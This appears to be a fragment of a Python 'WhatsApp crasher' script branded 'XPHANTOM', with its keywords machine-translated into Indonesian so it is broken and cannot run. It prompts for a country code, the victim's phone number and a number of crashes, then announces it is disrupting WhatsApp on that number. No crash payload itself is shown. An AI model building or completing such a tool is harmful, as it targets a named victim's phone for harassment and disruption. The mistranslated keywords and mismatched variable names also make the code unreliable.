             |_____|                                      
                                                   
{ W }
XPHANTOM PH4N70M													  
"""
os . sistem ( 'jelas' )

def  utama ():
	os . sistem ( 'jelas' )
	cetak ( logo )
	cetak ()
	cncode = int ( input ( f' { G } [ { Y } + { G } ] { M } Masukkan Kode Negara Tanpa "+" mis.91 { C } => ' ))
	cetak ()
	num = input ( f" { G } [ { Y } + { G } ] { M } Masukkan Nomor Telepon Korban \n \n { C } => { cncode }   " )
	cetak ()
	crash = int ( input ( f' { G } [ { Y } + { G } ] { M } Masukkan jumlah crash { W } (Maks. 15 per 30 menit) \n \n { C } => ' ))
	combnum  =  f"+ { cncode } { num } "
	cetak ()
	Panggilan akhir = input ( f' { G } [?] { W } Apakah Anda Ingin Mengubah NO. { W } { combnum }  { R } (Y/T) \n \n { C } => ' )
	jika  Finalcall  ==  'Y'   atau  Finalcall  ==  'y' :
		utama ()
	elif  Finalcall  ==  'N'  atau  Finalcall  ==  'n' :
		os . sistem ( 'jelas' )
		print ( f" { G } [ { Y } + { G } ] { M } Mengganggu Whatsapp di No. : + { cncode } { num } ..." )
		waktu . tidur ( 5 )
